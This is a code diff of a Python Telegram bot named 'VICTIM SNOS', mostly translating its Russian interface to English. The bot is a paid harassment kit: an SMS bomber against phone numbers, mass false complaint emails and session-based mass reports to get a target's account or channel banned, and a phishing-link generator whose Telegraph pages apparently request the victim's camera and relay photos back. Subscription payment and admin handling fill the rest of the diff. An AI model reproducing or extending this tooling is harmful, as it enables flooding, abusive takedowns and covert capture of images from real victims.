+    await send_message_with_banner(msg, f"Bomber finished\n\nPhone: <code>{phone}</code>\nSMS: <b>{ok}</b>", get_main_menu(user_id))
 
 @dp.callback_query(F.data == "mail_menu")
 async def mail_menu(cb: types.CallbackQuery):
-    await edit_message_with_banner(cb, "📧 Снос по почте", get_mail_menu())
+    await edit_message_with_banner(cb, "Mail complaints", get_mail_menu())
     await cb.answer()
 
 @dp.callback_query(F.data == "mail_acc")
 async def mail_acc_menu(cb: types.CallbackQuery):
-    await edit_message_with_banner(cb, "👤 Жалоба на аккаунт", get_mail_account_menu())
+    await edit_message_with_banner(cb, "Report account", get_mail_account_menu())
     await cb.answer()
 
 @dp.callback_query(F.data.startswith("mailacc_"))
@@ -1577,7 +1465,7 @@ async def mail_acc_type(cb: types.CallbackQuery, state: FSMContext):
     await state.update_data(complaint_type=complaint_type)
     await state.set_state(MailAccountState.waiting_username)
     await cb.message.delete()
-    await cb.message.answer("<b>🔥 VICTIM SNOS</b>\n\n📝 Введите username (без @):", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="mail_acc")]]))
+    await cb.message.answer("<b>VICTIM SNOS</b>\n\nEnter username:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="mail_acc")]]))
 
 @dp.message(StateFilter(MailAccountState.waiting_username))
 async def mail_acc_username(msg: types.Message, state: FSMContext):
@@ -1585,38 +1473,38 @@ async def mail_acc_username(msg: types.Message, state: FSMContext):
     await state.update_data(username=username)
     await state.set_state(MailAccountState.waiting_id)
     await msg.delete()
-    await send_message_with_banner(msg, "🆔 Введите Telegram ID:")
+    await send_message_with_banner(msg, "Enter Telegram ID:")
 
 @dp.message(StateFilter(MailAccountState.waiting_id))
 async def mail_acc_id(msg: types.Message, state: FSMContext):
     data = await state.get_data()
     username = data.get("username", "")
     telegram_id = msg.text.strip()
-    complaint_type = data.get("complaint_type", "2")
+    complaint_type = data.get("complaint_type", "1")
     user_id = msg.from_user.id
     
     await state.clear()
     await msg.delete()
     
     if not email_sender.senders:
-        await send_message_with_banner(msg, "❌ Ошибка: Нет отправителей в mail_config.json!", get_main_menu(user_id))
+        await send_message_with_banner(msg, "No senders configured!", get_main_menu(user_id))
         return
     
-    complaint = COMPLAINT_TEXTS_ACCOUNT.get(complaint_type, COMPLAINT_TEXTS_ACCOUNT["2"])
+    complaint = COMPLAINT_TEXTS_ACCOUNT.get(complaint_type, COMPLAINT_TEXTS_ACCOUNT["1"])
     body = complaint["body"].format(username=username, telegram_id=telegram_id)
     subject = complaint["subject"]
     
-    st = await send_message_with_banner(msg, "📤 Отправка...")
+    st = await send_message_with_banner(msg, "Sending...")
     loop = asyncio.get_event_loop()
     sent = await loop.run_in_executor(None, email_sender.send_mass, RECEIVERS, subject, body)
     await st.delete()
     
-    add_log(user_id, "Снос почтой", f"@{username} - {sent}")
-    await send_message_with_banner(msg, f"✅ Отправлено: <b>{sent}</b> писем", get_main_menu(user_id))
+    add_log(user_id, "Mail snos", f"@{username}")
+    await send_message_with_banner(msg, f"Sent: <b>{sent}</b> emails", get_main_menu(user_id))
 
 @dp.callback_query(F.data == "mail_chan")
 async def mail_chan_menu(cb: types.CallbackQuery):
-    await edit_message_with_banner(cb, "📢 Жалоба на канал", get_mail_channel_menu())
+    await edit_message_with_banner(cb, "Report channel", get_mail_channel_menu())
     await cb.answer()
 
 @dp.callback_query(F.data.startswith("mailchan_"))
@@ -1625,14 +1513,14 @@ async def mail_chan_type(cb: types.CallbackQuery, state: FSMContext):
     await state.update_data(complaint_type=complaint_type)
     await state.set_state(MailChannelState.waiting_channel)
     await cb.message.delete()
-    await cb.message.answer("<b>🔥 VICTIM SNOS</b>\n\n📝 Введите ссылку на канал:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="mail_chan")]]))
+    await cb.message.answer("<b>VICTIM SNOS</b>\n\nEnter channel link:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="mail_chan")]]))
 
 @dp.message(StateFilter(MailChannelState.waiting_channel))
 async def mail_chan_link(msg: types.Message, state: FSMContext):
     await state.update_data(channel=msg.text.strip())
     await state.set_state(MailChannelState.waiting_violation)
     await msg.delete()
-    await send_message_with_banner(msg, "🔗 Введите ссылку на нарушение:")
+    await send_message_with_banner(msg, "Enter violation link:")
 
 @dp.message(StateFilter(MailChannelState.waiting_violation))
 async def mail_chan_violation(msg: types.Message, state: FSMContext):
@@ -1646,47 +1534,43 @@ async def mail_chan_violation(msg: types.Message, state: FSMContext):
     await msg.delete()
     
     if not email_sender.senders:
-        await send_message_with_banner(msg, "❌ Ошибка: Нет отправителей!", get_main_menu(user_id))
+        await send_message_with_banner(msg, "No senders configured!", get_main_menu(user_id))
         return
     
     complaint = COMPLAINT_TEXTS_CHANNEL.get(complaint_type, COMPLAINT_TEXTS_CHANNEL["1"])
     body = complaint["body"].format(channel_link=channel, violation_link=violation)
     subject = complaint["subject"]
     
-    st = await send_message_with_banner(msg, "📤 Отправка...")
+    st = await send_message_with_banner(msg, "Sending...")
     loop = asyncio.get_event_loop()
     sent = await loop.run_in_executor(None, email_sender.send_mass, RECEIVERS, subject, body)
     await st.delete()
     
-    add_log(user_id, "Снос почтой (канал)", f"{channel} - {sent}")
-    await send_message_with_banner(msg, f"✅ Отправлено: <b>{sent}</b> писем", get_main_menu(user_id))
+    add_log(user_id, "Mail channel", channel)
+    await send_message_with_banner(msg, f"Sent: <b>{sent}</b> emails", get_main_menu(user_id))
 
 @dp.callback_query(F.data == "report_menu")
 async def report_menu(cb: types.CallbackQuery):
-    await edit_message_with_banner(cb, "💬 Снос сообщения", get_report_menu())
+    await edit_message_with_banner(cb, "Report message", get_report_menu())
     await cb.answer()
 
 @dp.callback_query(F.data == "report_msg")
 async def report_msg_start(cb: types.CallbackQuery, state: FSMContext):
     if not is_user_sessions_ready(cb.from_user.id):
-        await cb.answer("🔄 Сессии загружаются!", show_alert=True)
+        await cb.answer("Sessions loading!", show_alert=True)
         return
     
     await state.set_state(ReportMessageState.waiting_link)
     await cb.message.delete()
-    await cb.message.answer("<b>🔥 VICTIM SNOS</b>\n\n📝 Введите ссылку на сообщение:\n<code>https://t.me/username/123</code>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="report_menu")]]))
+    await cb.message.answer("<b>VICTIM SNOS</b>\n\nEnter message link:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="report_menu")]]))
 
 @dp.message(StateFilter(ReportMessageState.waiting_link))
 async def report_msg_link(msg: types.Message, state: FSMContext):
     link = msg.text.strip()
-    if not re.search(r't\.me/|telegram\.me/', link):
-        await msg.delete()
-        await send_message_with_banner(msg, "❌ Неверная ссылка!")
-        return
     await state.update_data(link=link)
     await state.set_state(ReportMessageState.waiting_reason)
     await msg.delete()
-    await msg.answer("<b>🔥 VICTIM SNOS</b>\n\n⚠️ Выберите причину:", reply_markup=get_report_reason_menu())
+    await msg.answer("<b>VICTIM SNOS</b>\n\nSelect reason:", reply_markup=get_report_reason_menu())
 
 @dp.callback_query(F.data.startswith("reason_"))
 async def report_msg_reason(cb: types.CallbackQuery, state: FSMContext):
@@ -1698,41 +1582,41 @@ async def report_msg_reason(cb: types.CallbackQuery, state: FSMContext):
     await state.clear()
     await cb.message.delete()
     
-    st = await cb.message.answer("<b>🔥 VICTIM SNOS</b>\n\n📤 Отправка жалоб...")
+    st = await cb.message.answer("<b>VICTIM SNOS</b>\n\nSending reports...")
     
-    ok, err = await mass_report_message(user_id, link, reason, None)
+    ok, err = await mass_report_message(user_id, link, reason)
     
     await st.delete()
     
     if err:
-        await send_message_with_banner(cb.message, f"❌ Ошибка: {err}", get_main_menu(user_id))
+        await send_message_with_banner(cb.message, f"Error: {err}", get_main_menu(user_id))
     else:
-        await send_message_with_banner(cb.message, f"✅ Отправлено жалоб: <b>{ok}</b>", get_main_menu(user_id))
+        await send_message_with_banner(cb.message, f"Reports sent: <b>{ok}</b>", get_main_menu(user_id))
 
 @dp.callback_query(F.data == "phish_menu")
 async def phish_menu(cb: types.CallbackQuery):
-    await edit_message_with_banner(cb, "🎣 Фишинг", get_phish_menu())
+    await edit_message_with_banner(cb, "Phishing", get_phish_menu())
     await cb.answer()
 
 @dp.callback_query(F.data == "phish_create")
 async def phish_create_start(cb: types.CallbackQuery, state: FSMContext):
     await state.set_state(PhishState.waiting_title)
     await cb.message.delete()
-    await cb.message.answer("<b>🔥 VICTIM SNOS</b>\n\n📝 Введите заголовок:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="phish_menu")]]))
+    await cb.message.answer("<b>VICTIM SNOS</b>\n\nEnter title:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="phish_menu")]]))
 
 @dp.message(StateFilter(PhishState.waiting_title))
 async def phish_title(msg: types.Message, state: FSMContext):
     await state.update_data(title=msg.text.strip())
     await state.set_state(PhishState.waiting_description)
     await msg.delete()
-    await send_message_with_banner(msg, "📝 Введите описание:")
+    await send_message_with_banner(msg, "Enter description:")
 
 @dp.message(StateFilter(PhishState.waiting_description))
 async def phish_description(msg: types.Message, state: FSMContext):
     await state.update_data(description=msg.text.strip())
     await state.set_state(PhishState.waiting_button)
     await msg.delete()
-    await send_message_with_banner(msg, "🔘 Введите текст кнопки:")
+    await send_message_with_banner(msg, "Enter button text:")
 
 @dp.message(StateFilter(PhishState.waiting_button))
 async def phish_button(msg: types.Message, state: FSMContext):
@@ -1745,7 +1629,7 @@ async def phish_button(msg: types.Message, state: FSMContext):
     await state.clear()
     await msg.delete()
     
-    st = await send_message_with_banner(msg, "🔗 Создание ссылки...")
+    st = await send_message_with_banner(msg, "Creating link...")
     
     page_id = hashlib.md5(f"{user_id}_{time.time()}".encode()).hexdigest()[:8]
     url = await create_telegraph_page(title, description, button_text, user_id, page_id)
@@ -1753,27 +1637,27 @@ async def phish_button(msg: types.Message, state: FSMContext):
     await st.delete()
     
     if url:
-        add_log(user_id, "Фишинг", url)
-        await send_message_with_banner(msg, f"✅ Ссылка создана!\n\n<code>{url}</code>\n\n📸 При переходе жертва увидит запрос камеры.", get_main_menu(user_id))
+        add_log(user_id, "Phishing", url)
+        await send_message_with_banner(msg, f"Link created:\n<code>{url}</code>", get_main_menu(user_id))
     else:
-        await send_message_with_banner(msg, "❌ Ошибка создания ссылки", get_main_menu(user_id))
+        await send_message_with_banner(msg, "Error creating link", get_main_menu(user_id))
 
 @dp.callback_query(F.data == "phish_list")
 async def phish_list(cb: types.CallbackQuery):
     user_pages = [(i, d) for i, d in phish_pages.items() if d["chat_id"] == cb.from_user.id]
     if not user_pages:
-        await edit_message_with_banner(cb, "📋 Нет созданных ссылок", InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 НАЗАД", callback_data="phish_menu")]]))
+        await edit_message_with_banner(cb, "No links", InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="BACK", callback_data="phish_menu")]]))
         return
     
-    text = "📋 Ваши ссылки:\n\n"
+    text = "Your links:\n\n"
     for _, d in user_pages[-5:]:
         text += f"<code>{d['url']}</code>\n\n"
     
-    await edit_message_with_banner(cb, text, InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 НАЗАД", callback_data="phish_menu")]]))
+    await edit_message_with_banner(cb, text, InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="BACK", callback_data="phish_menu")]]))
 
 @dp.callback_query(F.data == "purchase_menu")
 async def purchase_menu(cb: types.CallbackQuery):
-    await edit_message_with_banner(cb, "💰 Приобретение доступа\n\n📅 30 дней - 100 RUB / 100 ⭐\n📅 60 дней - 200 RUB / 200 ⭐\n♾️ Навсегда - 400 RUB / 400 ⭐", get_purchase_menu())
+    await edit_message_with_banner(cb, "Purchase access", get_purchase_menu())
     await cb.answer()
 
 @dp.callback_query(F.data.startswith("buy_rub_"))
@@ -1784,21 +1668,21 @@ async def buy_rub_subscription(cb: types.CallbackQuery):
     await bot.send_invoice(
         chat_id=cb.from_user.id,
         title=f"VICTIM SNOS - {duration}",
-        description=f"Доступ на {duration}",
+        description=f"Access for {duration}",
         payload=f"sub_{duration}",
         provider_token=PAYMENT_PROVIDER_TOKEN,
         currency="RUB",
-        prices=[LabeledPrice(label=f"Доступ {duration}", amount=prices * 100)],
+        prices=[LabeledPrice(label=f"Access {duration}", amount=prices * 100)],
         start_parameter="victim_snos",
         protect_content=True
     )
     await cb.message.delete()
-    await cb.message.answer("💳 Счет выставлен. Проверьте сообщение с оплатой.")
+    await cb.message.answer("Invoice sent.")
     await cb.answer()
 
 @dp.callback_query(F.data == "buy_stars_menu")
 async def buy_stars_menu(cb: types.CallbackQuery):
-    await edit_message_with_banner(cb, "⭐ Оплата Звездами", get_stars_purchase_menu())
+    await edit_message_with_banner(cb, "Pay with Stars", get_stars_purchase_menu())
     await cb.answer()
 
 @dp.callback_query(F.data.startswith("buy_stars_"))
@@ -1809,16 +1693,16 @@ async def buy_stars_subscription(cb: types.CallbackQuery):
     await bot.send_invoice(
         chat_id=cb.from_user.id,
         title=f"VICTIM SNOS - {duration}",
-        description=f"Доступ на {duration}",
+        description=f"Access for {duration}",
         payload=f"stars_{duration}",
         provider_token="",
         currency="XTR",
-        prices=[LabeledPrice(label=f"Доступ {duration}", amount=prices)],
+        prices=[LabeledPrice(label=f"Access {duration}", amount=prices)],
         start_parameter="victim_snos",
         protect_content=True
     )
     await cb.message.delete()
-    await cb.message.answer("⭐ Счет выставлен.")
+    await cb.message.answer("Invoice sent.")
     await cb.answer()
 
 @dp.pre_checkout_query()
@@ -1835,14 +1719,14 @@ async def process_successful_payment(msg: types.Message):
             add_subscription(msg.from_user.id, forever=True)
         else:
             add_subscription(msg.from_user.id, days=int(duration.replace("d", "")))
-        await msg.answer(f"✅ Оплата успешна! Доступ на {duration}.")
+        await msg.answer(f"Payment successful! Access for {duration}.")
     elif payload.startswith("stars_"):
         duration = payload.replace("stars_", "")
         if duration == "forever":
             add_subscription(msg.from_user.id, forever=True)
         else:
             add_subscription(msg.from_user.id, days=int(duration.replace("d", "")))
-        await msg.answer(f"✅ Оплата успешна! Доступ на {duration}.")
+        await msg.answer(f"Payment successful! Access for {duration}.")
     
     if msg.from_user.id not in user_sessions or not user_sessions[msg.from_user.id].get("ready"):
         asyncio.create_task(ensure_user_sessions(msg.from_user.id))
@@ -1851,7 +1735,7 @@ async def process_successful_payment(msg: types.Message):
 async def use_promo_start(cb: types.CallbackQuery, state: FSMContext):
     await state.set_state(PurchaseState.waiting_promo)
     await cb.message.delete()
-    await cb.message.answer("<b>🔥 VICTIM SNOS</b>\n\n🎫 Введите промокод:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="purchase_menu")]]))
+    await cb.message.answer("<b>VICTIM SNOS</b>\n\nEnter promo code:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="purchase_menu")]]))
 
 @dp.message(StateFilter(PurchaseState.waiting_promo))
 async def process_promo(msg: types.Message, state: FSMContext):
@@ -1864,11 +1748,11 @@ async def process_promo(msg: types.Message, state: FSMContext):
             add_subscription(msg.from_user.id, days=promo["days"])
             promo["uses"] -= 1
             save_promo_codes()
-            await send_message_with_banner(msg, f"✅ Промокод активирован! Доступ на {promo['days']} дней.", get_main_menu(msg.from_user.id))
+            await send_message_with_banner(msg, f"Promo activated! {promo['days']} days.", get_main_menu(msg.from_user.id))
         else:
-            await send_message_with_banner(msg, "❌ Промокод истек!", get_purchase_menu())
+            await send_message_with_banner(msg, "Promo expired!", get_purchase_menu())
     else:
-        await send_message_with_banner(msg, "❌ Неверный промокод!", get_purchase_menu())
+        await send_message_with_banner(msg, "Invalid promo!", get_purchase_menu())
     
     await state.clear()
 
@@ -1876,14 +1760,15 @@ async def process_promo(msg: types.Message, state: FSMContext):
 async def admin_menu_handler(cb: types.CallbackQuery):
     if cb.from_user.id != ADMIN_ID:
         return
-    await edit_message_with_banner(cb, "👑 Панель администратора", get_admin_menu())
+    await edit_message_with_banner(cb, "Admin panel", get_admin_menu())
     await cb.answer()
 
 @dp.callback_query(F.data == "admin_logs")
 async def admin_logs(cb: types.CallbackQuery):
     if cb.from_user.id != ADMIN_ID:
         return
-    await edit_message_with_banner(cb, f"📊 Логи:\n\n{get_last_logs(10)}", InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 НАЗАД", callback_data="admin_menu")]]))
+    logs = "\n".join([f"[{l['time']}] {l['user_id']} - {l['action']}: {l['target']}" for l in usage_logs[-10:]])
+    await edit_message_with_banner(cb, f"Logs:\n\n{logs}" if logs else "Empty", InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="BACK", callback_data="admin_menu")]]))
 
 @dp.callback_query(F.data == "admin_add")
 async def admin_add(cb: types.CallbackQuery, state: FSMContext):
@@ -1892,7 +1777,7 @@ async def admin_add(cb: types.CallbackQuery, state: FSMContext):
     await state.set_state(AdminState.waiting_user_id)
     await state.update_data(admin_action="add_forever")
     await cb.message.delete()
-    await cb.message.answer("<b>🔥 VICTIM SNOS</b>\n\n🆔 Введите ID пользователя:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="admin_menu")]]))
+    await cb.message.answer("<b>VICTIM SNOS</b>\n\nEnter user ID:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="admin_menu")]]))
 
 @dp.callback_query(F.data == "admin_add_days")
 async def admin_add_days_start(cb: types.CallbackQuery, state: FSMContext):
@@ -1901,7 +1786,7 @@ async def admin_add_days_start(cb: types.CallbackQuery, state: FSMContext):
     await state.set_state(AdminState.waiting_user_id)
     await state.update_data(admin_action="add_days")
     await cb.message.delete()
-    await cb.message.answer("<b>🔥 VICTIM SNOS</b>\n\n🆔 Введите ID пользователя:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="admin_menu")]]))
+    await cb.message.answer("<b>VICTIM SNOS</b>\n\nEnter user ID:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="admin_menu")]]))
 
 @dp.message(StateFilter(AdminState.waiting_user_id))
 async def admin_user_id_received(msg: types.Message, state: FSMContext):
@@ -1916,15 +1801,15 @@ async def admin_user_id_received(msg: types.Message, state: FSMContext):
         if action == "add_forever":
             add_subscription(user_id, forever=True)
             await msg.delete()
-            await send_message_with_banner(msg, f"✅ Пользователь <code>{user_id}</code> добавлен", get_admin_menu())
+            await send_message_with_banner(msg, f"User <code>{user_id}</code> added", get_admin_menu())
             await state.clear()
         elif action == "add_days":
             await state.set_state(AdminState.waiting_add_days)
             await msg.delete()
-            await send_message_with_banner(msg, "📅 Введите количество дней:")
+            await send_message_with_banner(msg, "Enter days:")
     except:
         await msg.delete()
-        await send_message_with_banner(msg, "❌ Неверный ID!")
+        await send_message_with_banner(msg, "Invalid ID!")
         await state.clear()
 
 @dp.message(StateFilter(AdminState.waiting_add_days))
@@ -1937,10 +1822,10 @@ async def admin_days_received(msg: types.Message, state: FSMContext):
         user_id = data["target_user_id"]
         add_subscription(user_id, days=days)
         await msg.delete()
-        await send_message_with_banner(msg, f"✅ Добавлено {days} дней пользователю <code>{user_id}</code>", get_admin_menu())
+        await send_message_with_banner(msg, f"Added {days} days to <code>{user_id}</code>", get_admin_menu())
     except:
         await msg.delete()
-        await send_message_with_banner(msg, "❌ Неверное количество дней!")
+        await send_message_with_banner(msg, "Invalid days!")
     await state.clear()
 
 @dp.callback_query(F.data == "admin_create_promo")
@@ -1949,7 +1834,7 @@ async def admin_create_promo_start(cb: types.CallbackQuery, state: FSMContext):
         return
     await state.set_state(AdminState.waiting_promo_code)
     await cb.message.delete()
-    await cb.message.answer("<b>🔥 VICTIM SNOS</b>\n\n🎫 Введите промокод:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="admin_menu")]]))
+    await cb.message.answer("<b>VICTIM SNOS</b>\n\nEnter promo code:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="admin_menu")]]))
 
 @dp.message(StateFilter(AdminState.waiting_promo_code))
 async def admin_promo_code(msg: types.Message, state: FSMContext):
@@ -1959,7 +1844,7 @@ async def admin_promo_code(msg: types.Message, state: FSMContext):
     await state.update_data(promo_code=code)
     await state.set_state(AdminState.waiting_promo_days)
     await msg.delete()
-    await send_message_with_banner(msg, "📅 Введите количество дней:")
+    await send_message_with_banner(msg, "Enter days:")
 
 @dp.message(StateFilter(AdminState.waiting_promo_days))
 async def admin_promo_days(msg: types.Message, state: FSMContext):
@@ -1970,10 +1855,10 @@ async def admin_promo_days(msg: types.Message, state: FSMContext):
         await state.update_data(promo_days=days)
         await state.set_state(AdminState.waiting_promo_uses)
         await msg.delete()
-        await send_message_with_banner(msg, "🔢 Введите количество использований:")
+        await send_message_with_banner(msg, "Enter uses:")
     except:
         await msg.delete()
-        await send_message_with_banner(msg, "❌ Неверное число!")
+        await send_message_with_banner(msg, "Invalid number!")
 
 @dp.message(StateFilter(AdminState.waiting_promo_uses))
 async def admin_promo_uses(msg: types.Message, state: FSMContext):
@@ -1989,23 +1874,23 @@ async def admin_promo_uses(msg: types.Message, state: FSMContext):
         save_promo_codes()
         
         await msg.delete()
-        await send_message_with_banner(msg, f"✅ Промокод <code>{code}</code> создан!\n📅 Дней: {days}\n🔢 Использований: {uses}", get_admin_menu())
+        await send_message_with_banner(msg, f"Promo <code>{code}</code> created!\nDays: {days}\nUses: {uses}", get_admin_menu())
     except:
         await msg.delete()
-        await send_message_with_banner(msg, "❌ Неверное число!")
+        await send_message_with_banner(msg, "Invalid number!")
     await state.clear()
 
 @dp.callback_query(F.data == "admin_remove")
 async def admin_remove(cb: types.CallbackQuery):
     if cb.from_user.id != ADMIN_ID or not ALLOWED_USERS:
-        await cb.answer("Нет пользователей", show_alert=True)
+        await cb.answer("No users", show_alert=True)
         return
     builder = InlineKeyboardBuilder()
     for uid in list(ALLOWED_USERS.keys())[:20]:
-        builder.button(text=f"❌ Удалить {uid}", callback_data=f"remove_{uid}")
-    builder.button(text="🔙 НАЗАД", callback_data="admin_menu")
+        builder.button(text=f"Remove {uid}", callback_data=f"remove_{uid}")
+    builder.button(text="BACK", callback_data="admin_menu")
     builder.adjust(1)
-    await edit_message_with_banner(cb, "👥 Выберите пользователя:", builder.as_markup())
+    await edit_message_with_banner(cb, "Select user:", builder.as_markup())
 
 @dp.callback_query(F.data.startswith("remove_"))
 async def admin_remove_process(cb: types.CallbackQuery):
@@ -2015,15 +1900,15 @@ async def admin_remove_process(cb: types.CallbackQuery):
     if user_id in ALLOWED_USERS:
         del ALLOWED_USERS[user_id]
         save_allowed_users()
-    await edit_message_with_banner(cb, f"✅ Пользователь <code>{user_id}</code> удален", get_admin_menu())
+    await edit_message_with_banner(cb, f"User <code>{user_id}</code> removed", get_admin_menu())
 
 @dp.callback_query(F.data == "admin_list")
 async def admin_list(cb: types.CallbackQuery):
     if cb.from_user.id != ADMIN_ID:
         return
-    text = "👥 Пользователи:\n\n"
+    text = "Users:\n\n"
     for uid, data in list(ALLOWED_USERS.items())[:30]:
-        expire = data.get("expire_date", "неизвестно")
+        expire = data.get("expire_date", "unknown")
         if expire != "forever":
             try:
                 expire = datetime.fromisoformat(expire).strftime("%d.%m.%Y")
@@ -2032,40 +1917,38 @@ async def admin_list(cb: types.CallbackQuery):
         text += f"<code>{uid}</code> - {expire}\n"
     
     if not ALLOWED_USERS:
-        text += "Пусто"
-    elif len(ALLOWED_USERS) > 30:
-        text += f"\n... и еще {len(ALLOWED_USERS) - 30}"
+        text += "Empty"
     
-    await edit_message_with_banner(cb, text, InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 НАЗАД", callback_data="admin_menu")]]))
+    await edit_message_with_banner(cb, text, InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="BACK", callback_data="admin_menu")]]))
 
 @dp.callback_query(F.data == "main_menu")
 async def main_menu(cb: types.CallbackQuery, state: FSMContext):
     await state.clear()
-    await edit_message_with_banner(cb, "👋 Выберите действие:", get_main_menu(cb.from_user.id))
+    await edit_message_with_banner(cb, "Select action:", get_main_menu(cb.from_user.id))
 
 @dp.callback_query(F.data == "refresh_sessions")
 async def refresh_sessions(cb: types.CallbackQuery):
     if cb.from_user.id in active_attacks:
-        await cb.answer("⚠️ Нельзя обновить во время сноса!", show_alert=True)
+        await cb.answer("Cannot refresh during attack!", show_alert=True)
         return
-    await cb.answer("🔄 Обновление...")
+    await cb.answer("Refreshing...")
     asyncio.create_task(refresh_user_sessions(cb.from_user.id))
 
 @dp.callback_query(F.data == "status")
 async def status(cb: types.CallbackQuery):
     user_id = cb.from_user.id
     user_id_str = str(user_id)
-    expire = "Нет доступа"
+    expire = "No access"
     if user_id_str in ALLOWED_USERS:
-        expire = ALLOWED_USERS[user_id_str].get("expire_date", "неизвестно")
+        expire = ALLOWED_USERS[user_id_str].get("expire_date", "unknown")
         if expire != "forever":
             try:
-                expire = datetime.fromisoformat(expire).strftime("%d.%m.%Y %H:%M")
+                expire = datetime.fromisoformat(expire).strftime("%d.%m.%Y")
             except:
                 pass
     
-    sessions_count = get_user_sessions_count(user_id)
-    await edit_message_with_banner(cb, f"📊 Статус\n\n🆔 ID: <code>{user_id}</code>\n📅 Доступ: {expire}\n🔐 Сессий: {sessions_count}/{SESSIONS_PER_USER}", InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 НАЗАД", callback_data="main_menu")]]))
+    sessions_count = len(user_sessions.get(user_id, {}).get("sessions", []))
+    await edit_message_with_banner(cb, f"ID: <code>{user_id}</code>\nAccess: {expire}\nSessions: {sessions_count}", InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="BACK", callback_data="main_menu")]]))
 
 @dp.callback_query(F.data == "stop")
 async def stop(cb: types.CallbackQuery):
@@ -2082,15 +1965,14 @@ async def stop(cb: types.CallbackQuery):
         del active_bombers[user_id]
         stopped = True
     
-    await edit_message_with_banner(cb, "⏹️ Остановлено" if stopped else "ℹ️ Нет активных атак", get_main_menu(user_id))
+    await edit_message_with_banner(cb, "Stopped" if stopped else "No active attacks", get_main_menu(user_id))
 
 @dp.message(F.photo)
 async def handle_photo(msg: types.Message):
     if msg.caption:
         for page_id, page in phish_pages.items():
-            if page_id in msg.caption or "Фото с камеры" in msg.caption:
-                await msg.reply(f"📸 Новое фото!\n\n🔗 {page['url']}")
-                add_log(msg.from_user.id if msg.from_user else 0, "Фишинг: фото", page['url'])
+            if page_id in msg.caption or "victim" in msg.caption.lower():
+                add_log(msg.from_user.id if msg.from_user else 0, "Phish photo", page['url'])
                 break
 
 
@@ -2100,13 +1982,9 @@ async def main():
     load_payments()
     load_promo_codes()
     
-    # Создаем папку для сессий
     os.makedirs("sessions", exist_ok=True)
     
-    logger.info("🔥 VICTIM SNOS запущен")
-    logger.info(f"💣 Bomber sites: {len(BOMBER_SITES)}")
-    logger.info(f"🌐 OAuth sites: {len(OAUTH_SITES)}")
-    logger.info(f"📱 SMS per round: {SMS_PER_ROUND}")
+    logger.info("VICTIM SNOS started")
     
     await bot.delete_webhook(drop_pending_updates=True)
     await dp.start_polling(bot)
